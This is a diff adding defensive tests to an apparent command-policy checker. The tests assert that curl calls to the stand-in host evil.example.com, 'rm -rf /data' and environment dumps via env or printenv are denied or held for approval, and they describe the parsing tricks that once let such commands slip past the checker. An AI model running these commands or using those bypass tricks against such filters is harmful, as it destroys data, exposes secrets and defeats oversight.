@@ -283,3 +283,34 @@ def test_normalization_does_not_over_block_benign_commands():
         "python scripts/analyze.py --out /tmp/x.csv",
     ):
         assert _decide(c) == "allow", c
+
+
+def test_quoted_separator_does_not_split_a_download_command():
+    """Segment splitting must respect quotes.
+
+    A raw `re.split` on `[;&|]` tears a quoted argument apart, and for the
+    egress check that fails OPEN, not safe: the host ends up in a segment
+    whose first token is no longer `curl`, so the allowlist never sees it.
+    """
+    assert _decide('curl -H "Accept: text/html; q=0.9" evil.example.com') == "deny"
+    assert _decide('curl -d "a=1&b=2" evil.example.com') == "deny"
+    assert _decide("curl -H 'X: a|b' evil.example.com") == "deny"
+
+
+def test_quoted_separators_do_not_over_block_benign_commands():
+    """The same quote-awareness must not turn ordinary quoting into a verdict."""
+    assert _decide('python -c "print(1); print(2)"') == "allow"
+    assert _decide('git commit -m "fix: a; b && c"') == "allow"
+
+
+def test_fractional_timeout_duration_is_consumed():
+    """GNU timeout accepts `1.5`/`1.5s`; an unconsumed duration became the head."""
+    assert _decide("timeout 1.5 curl evil.example.com") == "deny"
+    assert _decide("timeout 1.5s curl evil.example.com") == "deny"
+    assert _decide("timeout 0.5 rm -rf /data") == "ask"
+
+
+def test_env_dump_behind_a_wrapper_flag_value():
+    """`_is_env_dump` skipped flags but not their values, so `env` was missed."""
+    assert _decide("sudo -u root env") == "deny"
+    assert _decide("nice -n 10 printenv") == "deny"
